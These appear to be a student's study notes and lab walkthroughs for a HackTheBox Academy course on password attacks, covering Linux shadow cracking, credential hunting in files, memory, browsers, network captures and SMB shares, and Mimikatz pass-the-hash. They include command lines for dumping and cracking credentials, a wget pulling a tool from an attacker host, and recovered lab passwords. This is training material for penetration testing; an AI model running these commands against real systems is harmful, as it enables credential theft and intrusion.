DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

------------------- Lsa_secrets passwords -----------------

DPAPI_SYSTEM
0000   01 00 00 00 C0 3A 4A 9B 2C 04 5E 54 55 43 F3 DC    .....:J.,.^TUC..
0010   B9 C1 81 BB 17 D6 BD CE 50 B9 FA 0F D7 94 52 15    ........P.....R.
0020   01 11 35 73 08 74 8F 7C A1 01 94 4A                ..5s.t.|...J

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   E4 FE 18 4B 25 46 81 18 BF 23 F5 A3 2A E8 36 97    ...K%F...#..*.6.
0020   6B A4 92 B3 A4 32 DE B3 91 17 46 B8 EC 63 C4 51    k....2....F..c.Q
0030   A7 0C 18 26 E9 14 5A A2 F3 42 1B 98 ED 0C BD 9A    ...&..Z..B......
0040   0C 1A 1B EF AC B3 76 C5 90 FA 7B 56 CA 1B 48 8B    ......v...{V..H.
0050   32 B3 2C 95 2E 46 50 5A 46 F7 6E 53 66 FB DA 53    2.,..FPZF.nSf..S



########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22
```

4. What is the default password of every newly created `Inlanefreight` Domain user account? (Format: Case-Sensitive)

![[Pasted image 20261117162742.png]]

`Inlanefreightisgreat2022`

5. What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)

![[Pasted image 20261117162639.png]]


---
# Extracting Passwords From Linux Systems
## Linux Authentication Process

Linux-based distributions support various authentication mechanisms. One of the most commonly used is [Pluggable Authentication Modules (PAM)](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html). The modules responsible for this functionality, such as `pam_unix.so` or `pam_unix2.so`, are typically located in `/usr/lib/x86_64-linux-gnu/security/` on Debian-based systems. These modules manage user information, authentication, sessions, and password changes. For example, when a user changes their password using the `passwd` command, PAM is invoked, which takes the appropriate precautions to handle and store the information accordingly.

The `pam_unix.so` module uses standardized API calls from system libraries to update account information. The primary files it reads from and writes to are `/etc/passwd` and `/etc/shadow`. PAM also includes many other service modules, such as those for LDAP, mount operations, and Kerberos authentication.
### Passwd file

The `/etc/passwd` file contains information about every user on the system and is readable by all users and services. Each entry in the file corresponds to a single user and consists of `seven fields`, which store user-related data in a structured format. These fields are separated by colons (`:`). As such, a typical entry may look something like this:

```
htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
```

The most relevant field for our purposes is the `Password` field, as it can contain different types of entries. In rare cases (generally on very old systems) this field may hold the actual password hash. On modern systems, however, password hashes are stored in the `/etc/shadow` file, which we'll examine later. Despite this, the `/etc/passwd` file is world-readable, giving attackers the ability to crack the passwords if hashes are stored here.

Usually, we will find the value `x` in this field, indicating that the passwords are stored in a hashed form within the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to remove the password field for the `root` user entirely.

Although the scenarios described are rare, we should still pay attention and watch for potential security gaps, as there are applications that require specific permissions for entire folders. If the administrator has little experience with Linux (or the applications and their dependencies), they might mistakenly assign write permissions to the `/etc` directory and fail to correct them later.
### Shadow file

Since reading password hash values can put the entire system at risk, the `/etc/shadow` file was introduced. It has a similar format to `/etc/passwd` but is solely responsible for password storage and management. It contains all password information for created users. For example, if there is no entry in the `/etc/shadow` file for a user listed in `/etc/passwd`, that user is considered invalid. The `/etc/shadow` file is also only readable by users with administrative privileges. The format of this file is divided into the following `nine fields`:

```
htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
```


If the `Password` field contains a character such as `!` or `*`, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the `Password` field is empty, meaning no password is required for login. This can lead to certain programs denying access to specific functions. The `Password` field also follows a particular format, from which we can extract additional information:

- `$<id>$<salt>$<hashed>`

As we can see here, the hashed passwords are divided into three parts. The `ID` value specifies which cryptographic hash algorithm was used, typically one of the following:

| ID     | Cryptographic Hash Algorithm                                          |
| ------ | --------------------------------------------------------------------- |
| `1`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `2a`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `5`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `6`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `sha1` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `y`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `gy`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `7`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

Many Linux distributions, including Debian, now use `yescrypt` as the default hashing algorithm. On older systems, however, we may still encounter other hashing methods that can potentially be cracked. We'll discuss how the cracking process works shortly.
### Opasswd

The PAM library (`pam_unix.so`) can prevent users from reusing old passwords. These previous passwords are stored in the `/etc/security/opasswd` file. Administrator (root) privileges are required to read this file, assuming its permissions have not been modified manually.

```
mdn0x@htb[/htb]$ sudo cat /etc/security/opasswd
```

Looking at the contents of this file, we can see that it contains several entries for the user `cry0l1t3`, separated by a comma (`,`). One critical detail to pay attention to is the type of hash that's been used. This is because the `MD5` (`$1$`) algorithm is significantly easier to crack than SHA-512. This is particularly important when identifying old passwords and recognizing patterns, as users often reuse similar passwords across multiple services or applications. Recognizing these patterns can greatly improve our chances of correctly guessing the password.
### Cracking Linux Credentials

Once we have root access on a Linux machine, we can gather user password hashes and attempt to crack them using various methods to recover the plaintext passwords. To do this, we can use a tool called [unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c), which is included with John the Ripper (JtR). It works by combining the `passwd` and `shadow` files into a single file suitable for cracking.

```
mdn0x@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
mdn0x@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
mdn0x@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

This "unshadowed" file can now be attacked with either JtR or hashcat.

```
mdn0x@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

**Note:** This is the exact scenario that JtR's `single crack mode` was designed for.

For further reading on the Linux authentication process, this [document](https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf) by [The Linux Documentation Project](https://tldp.org) is a great reference.
### Exercise

1. Download the attached ZIP file (linux-authentication-process.zip), and use single crack mode to find martin's password. What is it?
2. Use a wordlist attack to find sarah's password. What is it?

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ unzip ebdc603e-28a2-4cdf-a24b-571c097eae7a.zip 
Archive:  ebdc603e-28a2-4cdf-a24b-571c097eae7a.zip
  inflating: passwd                  
  inflating: shadow  
  
└─$ unshadow passwd shadow > hashes
└─$ john hashes   
Martin1          (martin)     
mariposa         (sarah)  
```
## Credential Hunting in Linux

Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.

We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

- `Files` including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- `History` including logs, and command-line history
- `Memory` including cache, and in-memory processing
- `Key-rings` such as browser stored credentials

Enumerating all these categories will allow us to increase the probability of successfully finding out - with some ease - credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.
### Files

One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:

- Configuration files
- Databases
- Notes
- Scripts
- Cronjobs
- SSH keys

Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (`.config`, `.conf`, `.cnf`). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.

#### Searching for configuration files

The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.

```bash
mdn0x@htb[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (`user`, `password`, `pass`) in each file with the file extension `.cnf`.

```bash
mdn0x@htb[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

#### Searching for databases

We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those

```bash
mdn0x@htb[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

#### Searching for notes

Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as `.txt`. Therefore, in this case, we need to search for files including the `.txt` file extension and files that have no file extension at all.

```
mdn0x@htb[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
#### Searching for scripts

Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.

```bash
mdn0x@htb[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

#### Enumerating cronjobs

Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.

```bash
mdn0x@htb[/htb]$ cat /etc/crontab 
mdn0x@htb[/htb]$ ls -la /etc/cron.*/
```
#### Enumerating history files

All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes.

In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.

```
mdn0x@htb[/htb]$ tail -n5 /home/*/.bash*
```

An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:

- Application logs
- Event logs
- Service logs
- System logs

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

| **File**              | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |

Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:

```
mdn0x@htb[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [ $GREP ]($GREP.md);then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
### Memory and cache
#### Mimipenguin

Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.

```bash
mdn0x@htb[/htb]$ sudo python3 mimipenguin.py
```

LaZagne

An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:

    Wifi
    Wpa_supplicant
    Libsecret
    Kwallet
    Chromium-based
    CLI
    Mozilla
    Thunderbird
    Git
    ENV variables
    Grub
    Fstab
    AWS
    Filezilla
    Gftp
    SSH
    Apache
    Shadow
    Docker
    Keepass
    Mimipy
    Sessions
    Keyrings

For example, Keyrings are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.

```bash
mdn0x@htb[/htb]$ sudo python2.7 laZagne.py all
```
#### Browser credentials

Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the `Mozilla Firefox` browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.

For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.

```bash
[!bash]$ ls -l .mozilla/firefox/ | grep default 
mdn0x@htb[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.

```
mdn0x@htb[/htb]$ python3.9 firefox_decrypt.py
```


Alternatively, `LaZagne` can also return results if the user has used the supported browser.
### Exercise

1. Examine the target and find out the password of the user Will. Then, submit the password as the answer.

[[SSH]] to with user "kira" and password "L0vey0u1!"

```bash
kira@nix01:/home/will/.backups$ ls
passwd.bak  shadow.bak

kira@nix01:/home/will/.backups$ python3 -m http.server 8080


kira@nix01:/home/will$ locate firefox | grep -s "login"
locate: warning: database ‘/var/cache/locate/locatedb’ is more than 8 days old (actual age is 1742.0 days)
/home/kira/.mozilla/firefox/ytb95ytb.default-release/logins.json

kira@nix01:~/.mozilla/firefox$ cat ~/.bash_history

python3.9 firefox_decrypt.py 
cd ytb95ytb.default-release/

kira@nix01:~/.mozilla/firefox$ wget -r -nH http://10.10.15.108:8080/firefox_decrypt
kira@nix01:~/.mozilla/firefox$ python3.9 firefox_decrypt.py

kira@nix01:~/.mozilla/firefox/firefox_decrypt$ python3.9 firefox_decrypt.py
Select the Mozilla profile you wish to decrypt
1 -> lktd9y8y.default
2 -> ytb95ytb.default-release
2

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```


---
# Extracting Passwords From Network
## Credential Hunting in Network traffic

In today's security-conscious world, most applications wisely use TLS to encrypt sensitive data in transit. However, not all environments are fully secured. Legacy systems, misconfigured services, or test applications launched without HTTPS can still result in the use of unencrypted protocols such as HTTP or SNMP. These gaps present a valuable opportunity for attackers: `the chance to hunt for credentials in cleartext network traffic`. In this section, we'll explore practical techniques for identifying exposed information, such as usernames and passwords within common plaintext protocols using Wireshark. We'll also take a brief look at [Pcredz](https://github.com/lgandx/PCredz), a tool that can quickly scan network traffic for such data.

The table below lists several common protocols alongside their encrypted counterparts. While it is now more common to encounter the secure versions, there was a time when plaintext protocols were widely used.

The table below lists several common protocols alongside their encrypted counterparts. While it is now more common to encounter the secure versions, there was a time when plaintext protocols were widely used.

|Unencrypted Protocol|Encrypted Counterpart|Description|
|---|---|---|
|`HTTP`|`HTTPS`|Used for transferring web pages and resources over the internet.|
|`FTP`|`FTPS/SFTP`|Used for transferring files between a client and a server.|
|`SNMP`|`SNMPv3 (with encryption)`|Used for monitoring and managing network devices like routers and switches.|
|`POP3`|`POP3S`|Retrieves emails from a mail server to a local client.|
|`IMAP`|`IMAPS`|Accesses and manages email messages directly on the mail server.|
|`SMTP`|`SMTPS`|Sends email messages from client to server or between mail servers.|
|`LDAP`|`LDAPS`|Queries and modifies directory services like user credentials and roles.|
|`RDP`|`RDP (with TLS)`|Provides remote desktop access to Windows systems.|
|`DNS (Traditional)`|`DNS over HTTPS (DoH)`|Resolves domain names into IP addresses.|
|`SMB`|`SMB over TLS (SMB 3.0)`|Shares files, printers, and other resources over a network.|
|`VNC`|`VNC with TLS/SSL`|Allows graphical remote control of another computer.|
### Wireshark

[Wireshark](https://www.wireshark.org/) is a well-known packet analyzer that comes pre-installed in nearly all penetration testing Linux distributions. It features a powerful [filter engine](https://www.wireshark.org/docs/man-pages/wireshark-filter.html) that allows for efficient searching through both live and captured network traffic. Some basic but useful filters include:

| Wireshark filter                                  | Description                                                                                                                                                                          |
| ------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `ip.addr == 56.48.210.13`                         | Filters packets with a specific IP address                                                                                                                                           |
| `tcp.port == 80`                                  | Filters packets by port (HTTP in this case).                                                                                                                                         |
| `http`                                            | Filters for HTTP traffic.                                                                                                                                                            |
| `dns`                                             | Filters DNS traffic, which is useful to monitor domain name resolution.                                                                                                              |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0`        | Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.                                                                                  |
| `icmp`                                            | Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.                                                                                      |
| `http.request.method == "POST"`                   | Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within. |
| `tcp.stream eq 53`                                | Filters for a specific TCP stream. Helps track a conversation between two hosts.                                                                                                     |
| `eth.addr == 00:11:22:33:44:55`                   | Filters packets from/to a specific MAC address.                                                                                                                                      |
| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Filters traffic between two specific IP addresses. Helps track communication between specific hosts.                                                                                 |
It's worth familiarizing yourself with the syntax of Wireshark's filtering engine, especially if you ever need to perform network traffic analysis.
### Pcredz

[Pcredz](https://github.com/lgandx/PCredz) is a tool that can be used to extract credentials from live traffic or network packet captures. Specifically, it supports extracting the following information:

- Credit card numbers
- POP credentials
- SMTP credentials
- IMAP credentials
- SNMP community strings
- FTP credentials
- Credentials from HTTP NTLM/Basic headers, as well as HTTP Forms
- NTLMv1/v2 hashes from various traffic including DCE-RPC, SMBv1/2, LDAP, MSSQL, and HTTP
- Kerberos (AS-REQ Pre-Auth etype 23) hashes

In order to run `Pcredz`, one may either clone the repository and install all dependencies, or use the provided Docker container detailed in the [Install](https://github.com/lgandx/PCredz?tab=readme-ov-file#install) portion of the README file.

The following command can be used to run `Pcredz` against a packet capture file:

```bash
mdn0x@htb[/htb]$ ./Pcredz -f demo.pcapng -t -v
```
### Exercise

Download the attached `credential-hunting-in-network-traffic` and extract the `demo.pcapng` file, then use `Wireshark` or `PCredz` to answer the following questions.


1. The packet capture contains cleartext credit card information. What is the number that was transmitted?

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ wireshark demo.pcapng
```

![[Pasted image 20261117181950.png]]

![[Pasted image 20261117182022.png]]


```bash
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "card_name" = "Joshua M Benito"
    Form item: "card_number" = "5156 8829 4478 9834"
    Form item: "exp_date" = "12/30"
    Form item: "cvv" = "928"
    Form item: "product_id" = "SHRT553"
    Form item: "quantity" = "3"
    Form item: "price" = "49.99"

```

2. What is the `SNMPv2` community string that was used?

![[Pasted image 20261117182549.png]]

`s3cr3tSNMPC0mmun1ty`

3. What is the password of the user who logged into FTP?

![[Pasted image 20261117182345.png]]

4.     What file did the user download over FTP?

![[Pasted image 20261117182428.png]]

`creds.txt`
## Credential Hunting in Network Shares

Nearly all corporate environments include network shares used by employees to store and share files across teams. While these shared folders are essential, they can unintentionally become a goldmine for attackers, especially when sensitive data like plaintext credentials or configuration files are left behind. In this section, we'll explore how to hunt for credentials across network shares from both Windows and Linux systems using common tools, along with general techniques attackers use to uncover hidden secrets.

### Common credential patterns

Before diving into specialized tools, it's important to understand the types of patterns and file formats that often reveal sensitive information. This was covered in earlier sections, so we won't repeat it in detail here. But as a quick reminder, here are some general tips:

- Look for keywords within files such as `passw`, `user`, `token`, `key`, and `secret`.
- Search for files with extensions commonly associated with stored credentials, such as `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, and `.bat`.
- Watch for files with "interesting" names that include terms like `config`, `user`, `passw`, `cred`, or `initial`.
- If you're trying to locate credentials within the `INLANEFREIGHT.LOCAL` domain, it may be helpful to search for files containing the string `INLANEFREIGHT\`.
- Keywords should be localized based on the target; if you are attacking a German company, it's more likely they will reference a `"Benutzer"` than a `"User"`.
- Pay attention to the shares you are looking at, and be strategic. If you scan ten shares with thousands of files each, it's going to take a significant amount of time. Shares used by `IT employees` might be a more valuable target than those used for company photos.

With all of this in mind, you may want to begin with basic command-line searches (e.g., `Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...`) before scaling up to more advanced tools. Let's take a look at how we can use `MANSPIDER`, `Snaffler`, `SnafflePy`, and `NetExec` to automate and enhance this credential hunting process.
### Hunting from Windows

#### Snaffler

The first tool we will cover is [Snaffler](https://github.com/SnaffCon/Snaffler). This is a C# program that, when run on a `domain-joined` machine, automatically identifies accessible network shares and searches for interesting files. The `README` file in the Github repository describes the numerous configuration options in great detail, however a basic search can be carried out like so:

```powershell
c:\Users\Public>Snaffler.exe -s
```

All of the tools covered in this section output a `large amount of information`. While they assist with automation, a fair amount of manual review is typically required, as many matches may turn out to be `"false positives"`. Two useful parameters that can help refine Snaffler's search process are:

- `-u` retrieves a list of users from Active Directory and searches for references to them in files
- `-i` and `-n` allow you to specify which shares should be included in the search

### PowerHuntShares

Another tool that can be used is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares), a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an `HTML report` upon completion, providing an easy-to-use UI for reviewing the results.

We can run a basic scan using `PowerHuntShares` like so:

```powershell
PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```
### Hunting from Linux

#### MANSPIDER

If we don’t have access to a domain-joined computer, or simply prefer to search for files remotely, tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run `MANSPIDER` using the official Docker container to avoid dependency issues. Like the other tools, `MANSPIDER` offers many parameters that can be configured to fine-tune the search. A basic scan for files containing the string `passw` can be run as follows:

```bash
mdn0x@htb[/htb]$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

#### NetExec

In addition to its many other uses, [[NetExec]] can also be used to search through network shares using the `--spider` option. This functionality is described in great detail on the [official wiki](https://www.netexec.wiki/smb-protocol/spidering-shares). A basic scan of network shares for files containing the string `"passw"` can be run like so:

```bash
mdn0x@htb[/htb]$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```
### Exercise

Use the credentials `mendres:Inlanefreight2025!` to connect to the target either by RDP or WinRM, then use the tools and techniques taught in this section to answer the questions below. For your convenience, `Snaffler` and `PowerHuntShares` can be found in `C:\Users\Public`.

1. One of the shares `mendres` has access to contains valid credentials of another domain user. What is their password?

We can use [[SMBclient]] to list the shares:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/passwd_attacks]
└─$ smbclient -L \\\\target.htb\\ -U mendres 
Password for [WORKGROUP\mendres]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Company         Disk      
        Finance         Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        IT              Disk      
        Marketing       Disk      
        NETLOGON        Disk      Logon server share 
        Sales           Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to target.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Via [[XfreeRDP3]]:

![[Pasted image 20261117185324.png]]

jbader:ILovePower333###

Access as the new user:
![[Pasted image 20261117185638.png]]

![[Pasted image 20261117185947.png]]

![[Pasted image 20261117190049.png]]


2. As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?

```bash
nxc smb target.htb  -u jbader -p 'ILovePower333###' --spider ADMIN$ --content --pattern "passw"

Username: `Administrator`
Password: `Str0ng_Adm1nistrat0r_P@ssword_2025!`
```

---
# Windows Lateral Movement Techniques
## Pass The Hash (PtH)

A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).

Let's assume we obtain the password hash (`64F12CDDAA88057E06A81B54E73B949B`) for the account `julio` from the domain `inlanefreight.htb`. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.

**Note:** The tools we will be using are located in the `C:\tools` directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01).

### Introduction to Windows NTLM

Microsoft's [Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.

Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.

With NTLM, passwords stored on the server and domain controller are not "salted," which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a `Pass the Hash (PtH) Attack`.

### Pass the Hash with Mimikatz (Windows)

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

```powershell
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.
### Pass the Hash with PowerShell Invoke-TheHash (Windows)

Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user `julio` and the hash `64F12CDDAA88057E06A81B54E73B949B`.

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
